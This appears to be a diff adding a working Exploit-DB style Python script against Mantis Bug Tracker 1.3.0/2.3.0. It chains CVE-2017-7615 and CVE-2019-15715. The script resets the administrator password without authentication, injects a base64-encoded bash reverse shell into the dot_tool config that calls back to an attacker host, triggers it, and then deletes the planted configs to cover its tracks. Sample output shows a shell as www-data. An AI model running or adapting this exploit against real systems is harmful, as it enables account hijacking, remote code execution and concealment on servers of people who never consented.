@@ -1,0 +1,181 @@
+# Exploit Title: Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)
+# Date: 2020-09-17
+# Vulnerability Discovery: hyp3rlinx, permanull
+# Exploit Author: Nikolas Geiselman
+# Vendor Homepage: https://mantisbt.org/
+# Software Link: https://mantisbt.org/download.php
+# Version: 1.3.0/2.3.0
+# Tested on: Ubuntu 16.04/19.10/20.04
+# CVE : CVE-2017-7615, CVE-2019-15715
+# References: 
+# https://mantisbt.org/bugs/view.php?id=26091
+# https://www.exploit-db.com/exploits/41890
+
+'''
+
+This exploit chains together two CVE's to achieve unauthenticated remote code execution.
+The first portion of this exploit resets the Administrator password (CVE-2017-7615) discovered by John Page a.k.a hyp3rlinx, this portion was modified from the original https://www.exploit-db.com/exploits/41890.
+The second portion of this exploit takes advantage of a command injection vulnerability (CVE-2019-15715) discovered by 'permanull' (see references). 
+
+Usage:
+Set netcat listener on port 4444
+Send exploit with "python exploit.py"
+
+Example output:
+
+kali@kali:~/Desktop$ python exploit.py 
+Successfully hijacked account!
+Successfully logged in!
+Triggering reverse shell
+Cleaning up
+Deleting the dot_tool config.
+Deleting the relationship_graph_enable config.
+Successfully cleaned up
+
+
+kali@kali:~/Desktop$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.116.135] from (UNKNOWN) [192.168.116.151] 43978
+bash: cannot set terminal process group (835): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/html/mantisbt-2.3.0$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+'''
+
+import requests
+from urllib import quote_plus
+from base64 import b64encode
+from re import split
+
+
+class exploit():	
+	def __init__(self):
+		self.s = requests.Session()
+		self.headers = dict() # Initialize the headers dictionary
+		self.RHOST = "192.168.116.151" # Victim IP
+		self.RPORT = "80" # Victim port
+		self.LHOST = "192.168.116.135" # Attacker IP
+		self.LPORT = "4444" # Attacker Port
+		self.verify_user_id = "1" # User id for the target account
+		self.realname = "administrator" # Username to hijack
+		self.passwd = "password" # New password after account hijack
+		self.mantisLoc = "/mantisbt-2.3.0" # Location of mantis in URL
+		self.ReverseShell = "echo " + b64encode("bash -i >& /dev/tcp/" + self.LHOST + "/" + self.LPORT + " 0>&1") + " | base64 -d | /bin/bash" # Reverse shell payload
+
+		
+	def reset_login(self):
+		# Request # 1: Grab the account update token
+		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/verify.php?id=' + self.verify_user_id + '&confirm_hash='
+		r = self.s.get(url=url,headers=self.headers)
+		if r.status_code == 404:
+			print "ERROR: Unable to access password reset page"
+			exit()
+			
+		account_update_token = r.text.split('name="account_update_token" value=')[1].split('"')[1]
+
+		# Request # 2: Reset the account password
+		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/account_update.php'
+		data = "account_update_token=" + account_update_token + "&password=" + self.passwd + "&verify_user_id=" + self.verify_user_id + "&realname=" + self.realname + "&password_confirm=" + self.passwd
+		self.headers.update({'Content-Type':'application/x-www-form-urlencoded'})
+		r = self.s.post(url=url, headers=self.headers, data=data)
+
+		if r.status_code == 200:
+			print "Successfully hijacked account!"
+		
+
+	def login(self):
+		data = "return=index.php&username=" + self.realname + "&password=" + self.passwd + "&secure_session=on"
+		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/login.php'
+
+		r = self.s.post(url=url,headers=self.headers,data=data)
+		if "login_page.php" not in r.url:
+			print "Successfully logged in!"
+		
+	
+	def CreateConfigOption(self, option, value):
+		# Get adm_config_set_token			
+		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/adm_config_report.php'
+		r = self.s.get(url=url, headers=self.headers)
+
+		adm_config_set_token = r.text.split('name="adm_config_set_token" value=')[1].split('"')[1]
+		
+		# Create config
+		data = "adm_config_set_token=" + adm_config_set_token + "&user_id=0&original_user_id=0&project_id=0&original_project_id=0&config_option=" + option + "&original_config_option=&type=0&value=" + quote_plus(value) + "&action=create&config_set=Create+Configuration+Option"
+		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/adm_config_set.php'
+		r = self.s.post(url=url, headers=self.headers, data=data)		
+	
+		
+	def TriggerExploit(self):
+		print "Triggering reverse shell"
+			
+		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/workflow_graph_img.php'
+		try:
+			r = self.s.get(url=url,headers=self.headers, timeout=3)	
+		except:
+			pass	
+
+	
+	def Cleanup(self):
+		# Delete the config settings that were created to send the reverse shell	
+		print "Cleaning up"
+
+		cleaned_up = False
+
+		cleanup = requests.Session()
+
+		CleanupHeaders = dict()
+		CleanupHeaders.update({'Content-Type':'application/x-www-form-urlencoded'})
+
+		data = "return=index.php&username=" + self.realname + "&password=" + self.passwd + "&secure_session=on"
+		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/login.php'
+		r = cleanup.post(url=url,headers=CleanupHeaders,data=data)
+		
+		ConfigsToCleanup = ['dot_tool','relationship_graph_enable']
+		
+		for config in ConfigsToCleanup:
+			# Get adm_config_delete_token
+			url = "http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_report.php"
+			r = cleanup.get(url=url, headers=self.headers)
+			test = split('<!-- Repeated Info Rows -->',r.text)	
+			
+			# First element of the response list is garbage, delete it
+			del test[0]		
+				
+			cleanup_dict = dict()
+			for i in range(len(test)):
+				if config in test[i]:
+					cleanup_dict.update({'config_option':config})
+					cleanup_dict.update({'adm_config_delete_token':test[i].split('name="adm_config_delete_token" value=')[1].split('"')[1]})
+					cleanup_dict.update({'user_id':test[i].split('name="user_id" value=')[1].split('"')[1]})
+					cleanup_dict.update({'project_id':test[i].split('name="project_id" value=')[1].split('"')[1]})		
+			
+			
+			# Delete the config
+			print "Deleting the " + config + " config."
+			
+			url = "http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_delete.php"
+			data = "adm_config_delete_token=" + cleanup_dict['adm_config_delete_token'] + "&user_id=" + cleanup_dict['user_id'] + "&project_id=" + cleanup_dict['project_id'] + "&config_option=" + cleanup_dict['config_option'] + "&_confirmed=1"
+			r = cleanup.post(url=url,headers=CleanupHeaders,data=data)
+			
+			#Confirm if actually cleaned up
+			r = cleanup.get(url="http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_report.php", headers=CleanupHeaders, verify=False)
+			if config in r.text:
+				cleaned_up = False
+			else:
+				cleaned_up = True
+			
+		if cleaned_up == True:
+			print "Successfully cleaned up"
+		else:
+			print "Unable to clean up configs"
+		
+			
+exploit = exploit()
+exploit.reset_login()
+exploit.login()
+exploit.CreateConfigOption(option="relationship_graph_enable",value="1")
+exploit.CreateConfigOption(option="dot_tool",value= exploit.ReverseShell + ';')
+exploit.TriggerExploit()
+exploit.Cleanup()
